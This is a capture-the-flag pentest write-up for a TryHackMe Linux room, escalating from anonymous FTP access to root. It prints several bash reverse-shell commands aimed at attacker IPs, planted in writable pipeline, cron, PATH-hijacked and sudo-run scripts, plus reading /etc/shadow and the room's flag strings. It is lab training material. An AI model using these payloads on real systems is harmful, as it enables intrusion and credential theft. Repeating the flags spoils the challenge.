# Pentest Report — THMJump

## 1. Summary

- **Target:** 10.48.157.240
- **Objective:** Escalate from anonymous access through a misconfigured internal automation pipeline, moving laterally across accounts: `recon_user` → `dev_user` → `monitor_user` → `ops_user` → `root`.
- **Category:** Linux privilege escalation / lateral movement
- **Status:** Complete
- **Outcome:** Escalated the full chain from anonymous FTP access to root, capturing all 5 flags: `recon_user` → `dev_user` → `monitor_user` → `ops_user` → `root`.

## 2. Scope & Environment

| Item | Value |
|---|---|
| Target IP | 10.48.166.126 (was 10.48.157.240) |
| Attack box IP | 10.48.112.27 (was 10.48.85.29, was 10.48.126.12) |
| Challenge name | THMJump |
| Category | Linux privesc / lateral movement |
| Date started | 2026-09-28 |

Room description: a misconfigured internal automation pipeline on a Linux server processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each pipeline stage trusts the previous one too much, and abusing those trust boundaries is the intended path to move laterally: `recon_user` → `dev_user` → `monitor_user` → `ops_user` → `root`.

## 3. Methodology / Timeline

Chronological log of actions taken, in order. Filled in as the engagement progresses.

### 2026-09-28 — Initial recon

- Ran `nmap -sC -sV 10.48.157.240`:

| Port | Service | Version |
|---|---|---|
| 21/tcp | ftp | vsftpd 3.0.5 |
| 22/tcp | ssh | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |

- FTP script scan (`ftp-anon`, `ftp-syst`) results:
  ```
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  | drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
  |_drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
  ```
- Anonymous FTP is allowed, and `incoming/` is world-writable (777), confirmed directly by nmap's own scan without needing a manual login check.
- Connected via FTP as anonymous:
  ```
  ftp 10.48.157.240
  Name (10.48.157.240:root): anonymous
  230 Login successful.
  ftp> pwd
  Remote directory: /
  ```
- Listed root, then `incoming/`:
  ```
  ftp> ls
  drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming
  drwxr-xr-x    4 115      123          4096 Jun 09 08:22 pub
  ftp> cd incoming
  250 Directory successfully changed.
  ftp> ls
  226 Directory send OK.
  ```
  Two directories present, `incoming` and `pub`. `incoming/` is currently empty.
- Explored `pub/`:
  ```
  ftp> cd pub
  ftp> ls
  -rw-r--r--    1 0        0             139 Feb 02  2026 README.txt
  drwxr-xr-x    2 115      123          4096 Feb 01  2026 archive
  drwxrwxrwx    2 115      123          4096 Feb 01  2026 uploads
  ftp> get README.txt
  226 Transfer complete.
  ```
- Read the downloaded README.txt:
  ```
  [ recon pipeline ]

  All recon jobs must be placed in incoming/.
  Files are processed automatically on arrival.
  Invalid formats are ignored
  ```
- Confirms the automation pipeline processes/executes files dropped in `incoming/`.
- Built a bash reverse shell payload:
  ```bash
  #!/bin/bash/
  bash -i >& /dev/tcp/10.48.126.12/4444 0>&1
  ```
- Uploaded it into `incoming/` and removed it once caught:
  ```
  ftp> cd incoming
  ftp> put shell.sh
  226 Transfer complete.
  ftp> del shell.sh
  250 Delete operation successful.
  ```
- Set up a listener and caught the shell:
  ```
  nc -lvp 4444
  Connection received on ip-10-48-157-240.ap-south-1.compute.internal 52468
  recon_user@tryhackme-2404:~$ whoami
  recon_user
  ```
- Confirmed initial foothold as `recon_user`.
- Read the flag from `recon_user`'s home:
  ```
  cat flag.txt
  THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
  ```
- Served `pspy64` from the attack box and pulled it onto the target:
  ```
  python3 -m http.server
  Serving HTTP on 0.0.0.0 port 8000 ...

  wget http://10.48.126.12:8000/pspy64
  200 OK
  Length: 3104768 (3.0M)
  ```
- Made pspy64 executable and ran it to monitor processes:
  ```
  chmod +x pspy64
  ./pspy64
  ```
  Observed two recurring jobs:
  ```
  2026/09/28 08:03:36 CMD: UID=1003  PID=2232   | /bin/bash /usr/local/bin/healthcheck

  2026/09/28 08:04:01 CMD: UID=1002  PID=2256   | /bin/bash /opt/dev/backup.sh
  2026/09/28 08:04:01 CMD: UID=1002  PID=2257   | tar -czf /tmp/recon_backup.tgz /home/recon_user
  ```
  `/usr/local/bin/healthcheck` runs periodically as UID 1003 (`monitor_user`); `/opt/dev/backup.sh` runs periodically as UID 1002 (`dev_user`) and tars up `/home/recon_user` to `/tmp/recon_backup.tgz`.
- Checked `dev_user`'s group membership and `backup.sh`'s contents/permissions:
  ```
  id dev_user
  uid=1002(dev_user) gid=1002(dev_user) groups=1002(dev_user),1005(devops)

  cat /opt/dev/backup.sh
  #!/bin/bash
  tar -czf /tmp/recon_backup.tgz /home/recon_user

  ls -la /opt/dev/backup.sh
  -rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 /opt/dev/backup.sh
  ```
  Group-writable (`dev_user` group), same pattern as the previous run.
- Set up a listener on the attack box:
  ```
  nc -lvp 4445
  Listening on 0.0.0.0 4445
  ```
- Overwrote `/opt/dev/backup.sh` with a reverse shell payload:
  ```
  echo "bash -i >& /dev/tcp/10.48.126.12/4445/ 0>&1" > /opt/dev/backup.sh
  cat /opt/dev/backup.sh
  bash -i >& /dev/tcp/10.48.126.12/4445 / 0>&1
  ```
- Attack box IP changed to 10.48.85.29 (was 10.48.126.12). Corrected the payload and retried:
  ```
  echo "bash -i >& /dev/tcp/10.48.85.29/4445 0>&1" >/opt/dev/backup.sh
  cat /opt/dev/backup.sh
  bash -i >& /dev/tcp/10.48.85.29/4445 0>&1
  ```
- Caught the shell:
  ```
  nc -lvp 4445
  Connection received on ip-10-48-165-9.ap-south-1.compute.internal 51782
  dev_user@tryhackme-2404:~$
  ```
- Confirmed shell access as `dev_user`.
- Read the flag from `dev_user`'s home:
  ```
  cat flag.txt
  THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
  ```

### 2026-09-28 — Enumeration as dev_user

- Read the `healthcheck` script and checked its permissions:
  ```
  cat /usr/local/bin/healthcheck
  #!/bin/bash
  echo "Running as: $(whoami)"
  while true; do
    ps aux | grep -v grep
    sleep 5
  done

  ls -la /usr/local/bin/healthcheck
  -rwxr-xr-x 1 monitor_user monitor_user 98 Apr 29 10:35 /usr/local/bin/healthcheck
  ```
  Owned by `monitor_user`, calls `ps` unqualified, matches the pipeline behavior observed in pspy64 earlier.
- Checked sudo rights:
  ```
  sudo -l
  sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
  sudo: a password is required
  ```
  No usable sudo access without a TTY/password.
- Searched for related systemd units and writable directories:
  ```
  find / -type f -name "healthcheck*" 2>/dev/null
  /usr/local/bin/healthcheck
  /etc/systemd/system/healthcheck.service
  /etc/systemd/system/healthcheck.timer

  find / -type d -writable 2>/dev/null
  /srv/ftp/pub/uploads
  /srv/ftp/incoming
  /opt/dev
  /opt/dev/bin
  /home/dev_user
  /home/dev_user/.local
  /home/dev_user/.local/share
  /home/dev_user/.local/share/nano
  /tmp
  /var/tmp
  /var/tmp/cloud-init
  /var/crash
  /dev/mqueue
  /dev/shm
  /run/screen
  /run/cloud-init/tmp
  /run/lock
  ```
  `healthcheck` is scheduled via a systemd timer/service pair; `/opt/dev/bin` is writable by `dev_user`, same as the previous run.
- Read the unit files:
  ```
  cat /etc/systemd/system/healthcheck.service
  [Service]
  Type=simple
  User=monitor_user
  Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
  ExecStart=/usr/local/bin/healthcheck

  cat /etc/systemd/system/healthcheck.timer
  [Timer]
  OnBootSec=30
  OnUnitActiveSec=60
  ```
  Confirms the same PATH-hijack condition as the previous run: `healthcheck.service` runs as `monitor_user` with `/opt/dev/bin` first in its PATH, and `/opt/dev/bin` is writable by `dev_user`.
- Inspected the existing `/opt/dev/bin/ps` file, overwrote it with a new payload, and ran it manually:
  ```
  ls -la /opt/dev/bin
  -rw-rw-r-- 1 dev_user dev_user   62 Apr 26 18:19 ps

  cat /opt/dev/bin/ps
  #!/bin/bash
  setsid bash -i >& /dev/tcp/10.82.84.138/5557 0>&1

  echo "bash -i >& /dev/tcp/10.48.85.29/4446 0>&1" > /opt/dev/bin/ps
  chmod +x ps
  ./ps
  ```
  (Pre-existing `ps` again contained an unrelated payload pointed at 10.82.84.138:5557, overwritten.)
- Caught a shell on the new listener, but running `./ps` directly as `dev_user` only produced a `dev_user` shell, not `monitor_user`:
  ```
  nc -lvp 4446
  Connection received on ip-10-48-165-9.ap-south-1.compute.internal 38412
  dev_user@tryhackme-2404:/opt/dev/bin$ whoami
  dev_user
  ```
- Attack box and target IPs reassigned mid-engagement (10.48.85.29 → 10.48.112.27, 10.48.157.240 → 10.48.166.126). Waited for the `healthcheck.timer` to fire and caught the resulting shell on the updated listener:
  ```
  nc -lvp 4446
  Connection received on ip-10-48-166-126.ap-south-1.compute.internal 35538
  monitor_user@tryhackme-2404:/$ whoami
  monitor_user
  ```
- Confirmed shell access as `monitor_user` via PATH hijack of the `healthcheck` systemd service.
- Read the flag from `monitor_user`'s home:
  ```
  cat flag.txt
  THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
  ```

### 2026-09-28 — Enumeration as monitor_user

- Checked sudo rights:
  ```
  sudo -l
  User monitor_user may run the following commands on tryhackme-2404:
      (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
  ```
  `monitor_user` can run `/usr/local/bin/deploy.sh` as `ops_user` without a password.
- Read `deploy.sh` and `deploy_helper.sh`, and checked their permissions:
  ```
  ls -la /usr/local/bin/deploy.sh
  -rwxr-xr-x 1 ops_user ops_user 55 Feb  2  2026 /usr/local/bin/deploy.sh

  cat /usr/local/bin/deploy.sh
  #!/bin/bash
  cd /opt/app 2>/dev/null
  ./deploy_helper.sh

  cat /opt/app/deploy_helper.sh
  #!/bin/bash
  echo "[+] Deploy helper running"
  echo "[+] Syncing application files"
  sleep 2

  ls -la /opt/app/deploy_helper.sh
  -rwxr-xr-x 1 monitor_user monitor_user 90 Feb  2  2026 /opt/app/deploy_helper.sh
  ```
  `deploy.sh` is owned by `ops_user` (not writable by `monitor_user`) and `cd`s into `/opt/app` before running the relative `./deploy_helper.sh`, which is owned and writable by `monitor_user`.
- Appended a reverse shell payload to `deploy_helper.sh` (rather than overwriting it):
  ```
  echo "bash -i >& /dev/tcp/10.48.112.27/4447 0>&1" >> /opt/app/deploy_helper.sh
  cat /opt/app/deploy_helper.sh
  #!/bin/bash
  echo "[+] Deploy helper running"
  echo "[+] Syncing application files"
  sleep 2
  bash -i >& /dev/tcp/10.48.112.27/4447 0>&1
  ```
- Re-confirmed sudo rule and this time invoked `deploy.sh` through `sudo -u ops_user` (rather than running it directly):
  ```
  sudo -l
  User monitor_user may run the following commands on tryhackme-2404:
      (ops_user) NOPASSWD: /usr/local/bin/deploy.sh

  sudo -u ops_user deploy.sh
  [+] Deploy helper running
  [+] Syncing application files
  ```
- Caught the resulting shell:
  ```
  nc -lvp 4447
  Connection received on ip-10-48-166-126.ap-south-1.compute.internal 47060
  ops_user@tryhackme-2404:/opt/app$ whoami
  ops_user
  ```
- Confirmed shell access as `ops_user`.
- Read the flag from `ops_user`'s home:
  ```
  cat /home/ops_user/flag.txt
  THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
  ```

### 2026-09-28 — Enumeration as ops_user

- Checked sudo rights and permissions on the permitted binary:
  ```
  sudo -l
  User ops_user may run the following commands on tryhackme-2404:
      (root) NOPASSWD: /usr/bin/less

  ls -la /usr/bin/less
  -rwxr-xr-x 1 root root 194952 Apr 28  2024 /usr/bin/less
  ```
  `ops_user` can run `/usr/bin/less` as `root` without a password.
- Used the sudo grant to read `/etc/shadow` as root:
  ```
  sudo /usr/bin/less /etc/shadow
  ```
  Returned the full shadow file, including password hashes for `recon_user`, `dev_user`, `monitor_user`, `ops_user`. `root`'s entry shows `*` (no password hash set via this file).
- Ran `less` unprivileged against `/etc/hosts`:
  ```
  less /etc/hosts
  127.0.0.1 localhost
  ::1 ip6-localhost ip6-loopback
  ...
  ```
- Consulted GTFOBins for the `less` sudo entry.
- Attempted a shell-escape via `less`'s `!` command:
  ```
  sudo less /etc/hosts; !/bin/sh
  bash: !/bin/sh: No such file or directory
  ```
- Read the root flag directly via the sudo grant:
  ```
  sudo -u root less /root/flag.txt
  THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
  ```

## 4. Findings

_(One entry per vulnerability/technique. Filled in as discovered.)_

Severity methodology: CVSS v3.1 base score, computed with the official FIRST.org calculator. Bands: 9.0-10.0 Critical, 7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low.

### F1 — Anonymous FTP + Unrestricted Recon Pipeline Yields RCE as recon_user
- **Affected asset:** FTP service on 10.48.157.240:21, `incoming/` pipeline directory
- **Severity:** Critical — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, 9.8
- **Description:** The FTP service allows anonymous login and exposes a world-writable (777) `incoming/` directory. Files dropped there are automatically processed/executed by an unrestricted automation pipeline, allowing arbitrary command execution as the pipeline's user.
- **Evidence:**
  ```
  nmap ftp-anon: Anonymous FTP login allowed (FTP code 230)
  drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]

  # pub/README.txt:
  [ recon pipeline ]
  All recon jobs must be placed in incoming/.
  Files are processed automatically on arrival.
  Invalid formats are ignored

  ftp> put shell.sh
  226 Transfer complete.
  ```
  Payload:
  ```bash
  #!/bin/bash/
  bash -i >& /dev/tcp/10.48.126.12/4444 0>&1
  ```
  Result: reverse shell caught as `recon_user`.
- **Impact:** Unauthenticated remote code execution as `recon_user`, the first stage of the intended lateral-movement chain.
- **How found:** nmap's `ftp-anon` script flagged anonymous login and the writable `incoming/` directory directly; `pub/README.txt` confirmed the pipeline's automatic-processing behavior.
- **Recommendation:**

### F2 — Group-Writable Scheduled Script Enables Escalation to dev_user
- **Affected asset:** `/opt/dev/backup.sh`, run periodically by a scheduled job as `dev_user` (UID 1002)
- **Severity:** High — CVSS 3.1: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, 7.8
- **Description:** `/opt/dev/backup.sh` is group-writable by the `dev_user` group. `recon_user` is a member of that group, so it can overwrite the script's contents. The script is executed periodically as `dev_user` by an automated job, so any content placed there runs with `dev_user` privileges.
- **Evidence:**
  ```
  ls -la /opt/dev/backup.sh
  -rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 /opt/dev/backup.sh

  id
  groups=1001(recon_user),1002(dev_user),1005(devops)

  echo "bash -i >& /dev/tcp/10.48.85.29/4445 0>&1" >/opt/dev/backup.sh
  ```
  pspy64 confirmed periodic execution as UID 1002:
  ```
  CMD: UID=1002  PID=2256   | /bin/bash /opt/dev/backup.sh
  ```
  Result: reverse shell caught as `dev_user`.
- **Impact:** Privilege escalation from `recon_user` to `dev_user` via scheduled-task hijack.
- **How found:** pspy64 process monitoring surfaced the recurring `/opt/dev/backup.sh` execution; permission check showed it was group-writable by a group `recon_user` already belonged to.
- **Recommendation:**

### F3 — PATH Hijack of healthcheck systemd Service Enables Escalation to monitor_user
- **Affected asset:** `/etc/systemd/system/healthcheck.service` / `healthcheck.timer`, `/opt/dev/bin` (in the service's PATH), `/opt/dev/bin/ps`
- **Severity:** High — CVSS 3.1: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, 7.8
- **Description:** The `healthcheck.service` unit runs as `monitor_user` on a 60-second timer, with `Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin`. Its script (`/usr/local/bin/healthcheck`) calls `ps` unqualified. Because `/opt/dev/bin` is first in the service's PATH and is writable by `dev_user`, `dev_user` can plant an executable named `ps` there that the service will run in place of the real `ps`, executing arbitrary commands as `monitor_user`.
- **Evidence:**
  ```
  cat /etc/systemd/system/healthcheck.service
  User=monitor_user
  Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
  ExecStart=/usr/local/bin/healthcheck

  cat /usr/local/bin/healthcheck
  ps aux | grep -v grep

  ls -la /opt/dev/bin
  -rw-rw-r-- 1 dev_user dev_user   62 Apr 26 18:19 ps

  echo "bash -i >& /dev/tcp/10.48.85.29/4446 0>&1" > /opt/dev/bin/ps
  chmod +x ps
  ```
  Result: reverse shell caught as `monitor_user` once the timer fired.
- **Impact:** Privilege escalation from `dev_user` to `monitor_user` via PATH hijack of a privileged scheduled service.
- **How found:** Reading the systemd unit files for the `healthcheck` job (discovered via pspy64) revealed the service's PATH and the unqualified `ps` call; `find / -type d -writable` had already flagged `/opt/dev/bin` as writable by `dev_user`.
- **Recommendation:**

### F4 — Writable Relative-Path Helper Script Enables Escalation to ops_user via sudo
- **Affected asset:** `/usr/local/bin/deploy.sh` (sudo rule), `/opt/app/deploy_helper.sh`
- **Severity:** High — CVSS 3.1: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`, 7.8
- **Description:** `monitor_user` is permitted via `sudoers` to run `/usr/local/bin/deploy.sh` as `ops_user` with no password. `deploy.sh` itself is owned by `ops_user` and not directly writable, but it `cd`s into `/opt/app` and invokes a relative `./deploy_helper.sh`, which is owned and writable by `monitor_user`. Modifying `deploy_helper.sh` and invoking `deploy.sh` via the sudo rule executes the modified script as `ops_user`.
- **Evidence:**
  ```
  sudo -l
  User monitor_user may run the following commands on tryhackme-2404:
      (ops_user) NOPASSWD: /usr/local/bin/deploy.sh

  cat /usr/local/bin/deploy.sh
  cd /opt/app 2>/dev/null
  ./deploy_helper.sh

  ls -la /opt/app/deploy_helper.sh
  -rwxr-xr-x 1 monitor_user monitor_user 90 Feb  2  2026 /opt/app/deploy_helper.sh

  echo "bash -i >& /dev/tcp/10.48.112.27/4447 0>&1" >> /opt/app/deploy_helper.sh
  sudo -u ops_user deploy.sh
  ```
  Result: reverse shell caught as `ops_user`.
- **Impact:** Privilege escalation from `monitor_user` to `ops_user` by abusing a `sudo` rule pointing at a script that calls a monitor_user-writable helper.
- **How found:** `sudo -l` revealed the `deploy.sh` sudo grant; reading `deploy.sh` showed the relative call to `deploy_helper.sh`, and a permission check showed that helper script was writable by `monitor_user`.
- **Recommendation:**

### F5 — Passwordless sudo Grant on less Yields Root-Level File Access
- **Affected asset:** `/usr/bin/less` (sudo rule)
- **Severity:** Medium — CVSS 3.1: `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`, 5.5 (scored on the confidentiality-only impact actually demonstrated — a root-level file read; `less` is also a known GTFOBins shell-escape vector, which if achieved would score materially higher, but a shell was not confirmed here)
- **Description:** `ops_user` is permitted via `sudoers` to run `/usr/bin/less` as `root` with no password. This grants root-level read access to any file on the filesystem, including `/etc/shadow` and root-owned files such as `/root/flag.txt`.
- **Evidence:**
  ```
  sudo -l
  User ops_user may run the following commands on tryhackme-2404:
      (root) NOPASSWD: /usr/bin/less

  sudo /usr/bin/less /etc/shadow
  [full shadow file returned]

  sudo -u root less /root/flag.txt
  THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
  ```
- **Impact:** Root-level file disclosure as `ops_user`, including sensitive files such as `/etc/shadow` and files under `/root`.
- **How found:** `sudo -l` revealed the `less` grant, exercised directly.
- **Recommendation:**

## 5. Exploitation Chain

1. Recon with nmap identified FTP (21, anonymous login allowed, `incoming/` world-writable) and SSH (22).
2. Anonymous FTP login, combined with `pub/README.txt` disclosing the automation pipeline's behavior, allowed a bash reverse-shell payload to be dropped into `incoming/` and auto-executed, yielding a shell as `recon_user` (F1).
3. `recon_user`'s `dev_user` group membership, combined with pspy64-observed periodic execution of the group-writable `/opt/dev/backup.sh` as `dev_user`, allowed the script to be overwritten with a reverse shell payload, escalating to `dev_user` (F2).
4. Reading the `healthcheck.service`/`healthcheck.timer` systemd units revealed the service ran as `monitor_user` with `/opt/dev/bin` first in its PATH; that directory was writable by `dev_user`, so planting a malicious `ps` there hijacked the service's next execution, escalating to `monitor_user` (F3).
5. `sudo -l` as `monitor_user` revealed a passwordless grant to run `/usr/local/bin/deploy.sh` as `ops_user`; that script called a relative, `monitor_user`-writable `deploy_helper.sh`, which was modified with a reverse shell payload and triggered via `sudo -u ops_user deploy.sh`, escalating to `ops_user` (F4).
6. `sudo -l` as `ops_user` revealed a passwordless grant to run `/usr/bin/less` as `root`; used directly to read `/etc/shadow` and `/root/flag.txt`, completing the chain to root-level access (F5).

## 6. Flag & Proof

- **Flag 1 (recon_user):** `THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}`
- **Proof:** Reverse shell obtained as `recon_user` via anonymous FTP upload to `incoming/` (F1); flag read from `~/flag.txt`.
- **Flag 2 (dev_user):** `THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}`
- **Proof:** Shell obtained as `dev_user` via group-writable `backup.sh` hijack (F2); flag read from `~/flag.txt`.
- **Flag 3 (monitor_user):** `THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}`
- **Proof:** Shell obtained as `monitor_user` via PATH hijack of the `healthcheck` systemd service (F3); flag read from `~/flag.txt`.
- **Flag 4 (ops_user):** `THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}`
- **Proof:** Shell obtained as `ops_user` via sudo-permitted `deploy.sh` with a hijacked `deploy_helper.sh` (F4); flag read from `~/flag.txt`.
- **Flag 5 (root):** `THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}`
- **Proof:** Read directly via the passwordless `sudo -u root less /root/flag.txt` grant (F5).

## 7. Remediation

_(Optional — fill in if the challenge expects defensive recommendations.)_

## 8. Appendix

_(Raw command output, scripts, screenshots referenced from findings.)_
